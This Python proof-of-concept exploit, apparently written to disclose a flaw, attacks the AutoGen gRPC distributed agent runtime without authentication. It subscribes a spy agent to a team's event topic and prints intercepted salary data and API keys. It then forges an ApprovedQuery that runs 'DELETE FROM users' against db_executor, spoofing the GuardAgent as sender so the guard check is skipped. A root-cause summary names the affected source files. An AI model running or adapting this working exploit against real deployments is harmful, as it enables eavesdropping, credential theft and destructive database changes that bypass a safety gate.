"""
Malicious Worker - Attacker on the Same Network
=================================================
Connects to the SAME gRPC host as the legitimate worker.
No authentication, no credentials, no authorization needed.

Demonstrates two attacks:
  ATTACK 1: Subscription eavesdropping
    - Subscribes spy agent to 'team_events' topic
    - Receives ALL published events including sensitive data
    - Uses ONLY the public AddSubscription gRPC API

  ATTACK 2: Message forgery + sender spoofing
    - Sends ApprovedQuery directly to db_executor
    - Completely bypasses the GuardAgent
    - Spoofs the sender as 'guard_agent' (no verification)
"""

import asyncio
import json
import time

from autogen_core import (
    AgentId,
    RoutedAgent,
    message_handler,
    MessageContext,
    TypeSubscription,
    TopicId,
)
from autogen_core._serialization import try_get_known_serializers_for_type
from autogen_ext.runtimes.grpc import GrpcWorkerAgentRuntime

from messages import (
    UserQuery, SqlQuery, ApprovedQuery, QueryRejection,
    QueryResult, TeamEvent,
)


# Global list to store intercepted events
intercepted_events = []


class SpyAgent(RoutedAgent):
    """
    Eavesdropping agent. Receives messages from legitimate team's topic.
    Registered on the malicious worker, subscribed to 'team_events'.
    """

    def __init__(self):
        super().__init__("SpyAgent")

    @message_handler
    async def handle_event(self, message: TeamEvent, ctx: MessageContext) -> TeamEvent:
        """Intercept and log team events."""
        intercepted_events.append({
            "event_type": message.event_type,
            "source_agent": message.source_agent,
            "details": message.details,
            "timestamp": time.strftime("%H:%M:%S"),
        })
        print(f"  [SPY] !! Intercepted event !!")
        print(f"    Type: {message.event_type}")
        print(f"    From: {message.source_agent}")
        print(f"    Data: {message.details[:150]}")
        print(flush=True)
        return message


# ================================================================
# CONNECTION HELPER
# ================================================================

async def connect_to_host(host_address, max_retries=30, delay=2):
    """Connect to gRPC host with retry logic."""
    for attempt in range(max_retries):
        try:
            runtime = GrpcWorkerAgentRuntime(host_address=host_address)
            await runtime.start()
            print(f"  Connected to host on attempt {attempt + 1}")
            return runtime
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(delay)
            else:
                raise ConnectionError(
                    f"Could not connect to {host_address} after {max_retries} attempts"
                )


# ================================================================
# MAIN
# ================================================================

async def main():
    print("=" * 60)
    print(" MALICIOUS WORKER - Attacker")
    print("=" * 60)
    print()
    print("  This worker connects to the SAME gRPC host.")
    print("  No credentials. No authentication. No authorization.")
    print()
    print("  Attacks planned:")
    print("    1. Subscribe to team_events (eavesdropping)")
    print("    2. Send forged messages to db_executor")
    print()

    # Wait for legitimate worker to register its agents first
    print("  Waiting 5 seconds for legitimate worker to set up...")
    await asyncio.sleep(5)

    # Connect to host - NO AUTH NEEDED
    print("\n  Connecting to gRPC host (no credentials)...")
    runtime = await connect_to_host("host:50051")
    print("  Connected! No authentication was required.")

    # Explicitly register ALL message types for serialization
    # This is needed so we can serialize outgoing messages
    # and deserialize responses from the legitimate worker's agents
    for msg_type in [TeamEvent, ApprovedQuery, QueryResult, SqlQuery, UserQuery, QueryRejection]:
        for serializer in try_get_known_serializers_for_type(msg_type):
            runtime.add_message_serializer(serializer)
    print("  Message types registered for serialization.")

    # ============================================================
    # ATTACK 1: Subscription Eavesdropping
    # ============================================================
    print("\n" + "=" * 60)
    print("ATTACK 1: Subscription Eavesdropping")
    print("=" * 60)
    print()
    print("  Registering spy agent...")

    await SpyAgent.register(runtime, "spy", lambda: SpyAgent())

    print("  Subscribing to 'team_events' topic...")
    print("  This is the legitimate team's audit/monitoring topic.")
    print("  The AddSubscription gRPC RPC requires NO authorization.")

    await runtime.add_subscription(
        TypeSubscription(topic_type="team_events", agent_type="spy")
    )

    print("  Subscription active! Now eavesdropping...")
    print()
    print("  Waiting 25 seconds to collect events from legitimate team...")
    print("  (Legitimate worker will process queries during this time)")
    print(flush=True)

    await asyncio.sleep(25)

    # Show intercepted events
    print("\n" + "-" * 60)
    print(f"  EAVESDROPPING RESULTS: Intercepted {len(intercepted_events)} events")
    print("-" * 60)

    for i, evt in enumerate(intercepted_events):
        print(f"\n  Event #{i + 1} [{evt['timestamp']}]:")
        print(f"    Type:   {evt['event_type']}")
        print(f"    Source: {evt['source_agent']}")
        print(f"    Data:   {evt['details'][:300]}")

        # Parse and highlight sensitive data
        if evt["event_type"] == "query_result":
            try:
                data = json.loads(evt["details"])
                if "columns" in data and "rows" in data:
                    cols = data["columns"]
                    if "salary" in cols:
                        print("    >>> SENSITIVE: Contains salary data!")
                    if "key_value" in cols:
                        print("    >>> SENSITIVE: Contains API keys!")
                        for row in data["rows"]:
                            key_idx = cols.index("key_value")
                            print(f"    >>> STOLEN KEY: {row[key_idx]}")
            except (json.JSONDecodeError, KeyError, ValueError):
                pass

    # ============================================================
    # ATTACK 2: Message Forgery + Sender Spoofing
    # ============================================================
    print("\n\n" + "=" * 60)
    print("ATTACK 2: Message Forgery + Sender Spoofing")
    print("=" * 60)
    print()
    print("  The legitimate team's GuardAgent blocks DELETE queries.")
    print("  We bypass it by sending ApprovedQuery DIRECTLY to db_executor.")
    print("  We also spoof the sender as 'guard_agent' so it looks legitimate.")
    print()
    print("  Target:  AgentId('db_executor', 'default') on legitimate worker")
    print("  Message: ApprovedQuery(query='DELETE FROM users WHERE role != admin')")
    print("  Sender:  AgentId('guard_agent', 'default')  <-- FORGED!")
    print(flush=True)

    forgery_success = False
    try:
        result = await runtime.send_message(
            ApprovedQuery(query="DELETE FROM users WHERE role != 'admin'"),
            recipient=AgentId("db_executor", "default"),
            sender=AgentId("guard_agent", "default"),  # SPOOFED!
        )
        print("  >>> ATTACK SUCCEEDED!")
        print(f"  >>> db_executor response: {result.data}")
        print("  >>> The GuardAgent was COMPLETELY BYPASSED.")
        print("  >>> The sender was SPOOFED as 'guard_agent'.")
        print("  >>> db_executor had no way to verify the real sender.")
        forgery_success = True
    except Exception as e:
        print(f"  Attack error: {e}")

    # ============================================================
    # SUMMARY
    # ============================================================
    print("\n\n" + "=" * 60)
    print("ATTACK SUMMARY")
    print("=" * 60)
    eavesdrop_ok = len(intercepted_events) > 0
    print(f"""
  ATTACK 1 - Subscription Eavesdropping:
    Status:  {'SUCCESS' if eavesdrop_ok else 'NO EVENTS CAPTURED'}
    Events intercepted: {len(intercepted_events)}
    Method:  AddSubscription gRPC RPC (no authorization)
    Impact:  All published team events visible to attacker
             Includes query results, API keys, salary data

  ATTACK 2 - Message Forgery + Sender Spoofing:
    Status:  {'SUCCESS' if forgery_success else 'FAILED'}
    Method:  send_message() with forged sender AgentId
    Impact:  GuardAgent completely bypassed
             Destructive query executed on legitimate DB
             Sender field showed 'guard_agent' (forged)

  ROOT CAUSE - AutoGen gRPC Distributed Runtime:
    - grpc.aio.insecure_channel() used by default
    - RegisterAgent RPC has NO authentication
    - AddSubscription RPC has NO authorization/ACLs
    - Message sender field is NOT cryptographically signed
    - No access control on which agents can message which
    - Host routes messages purely based on agent type mapping

  AFFECTED CODE:
    autogen_ext/runtimes/grpc/_worker_runtime_host.py
      Line ~24: self._server.add_insecure_port(address)
    autogen_ext/runtimes/grpc/_worker_runtime.py
      Line ~144: grpc.aio.insecure_channel(host_address)
    autogen_ext/runtimes/grpc/_worker_runtime_host_servicer.py
      RegisterAgent/AddSubscription: NO auth checks
""", flush=True)

    await runtime.stop()
    print("  Malicious worker shut down.")


if __name__ == "__main__":
    asyncio.run(main())
